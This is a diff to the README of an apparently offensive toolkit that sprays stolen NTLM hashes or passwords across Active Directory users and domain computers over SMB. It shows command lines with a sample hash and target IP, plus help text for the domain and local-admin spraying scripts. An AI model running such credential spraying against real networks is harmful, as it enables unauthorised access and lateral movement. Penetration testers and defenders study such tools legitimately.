@@ -6,7 +6,7 @@ Got hashes from a compromised machine and want to test if the password hash have
 This was built using the impacket library
 
 ```
-python hashspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1
+python domainspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1
 ```
 Userlist example
 
@@ -16,6 +16,11 @@ user
 ```
 
 ```
+Active Directory Spraying Toolkit
+
+optional arguments:
+  -h, --help            show this help message and exit
+
 authentication:
   -userlist userlist    List of users to spray, format is [[domain/]username
   -password password    Clear-text password
@@ -31,6 +36,33 @@ connection:
   -target-ip ip address
                         IP Address of the target machine. This may be any be
                         any domain joined computer or a domain controller
+  -port [destination port]
+                        Destination port to connect to SMB Server
+
+threads:
+  -threads threads      Number of threads to use, default is 1
+```
+
+
+```
+python localspray.py -computerlist ./computers.txt -username administrator -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 
+```
+
+```
+Local Admin Spraying Toolkit
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+authentication:
+  -computerlist userlist
+                        List of computers to spray
+  -username username    Username
+  -password password    Clear-text password
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+
+connection:
   -port [destination port]
                         Destination port to connect to SMB Server
 
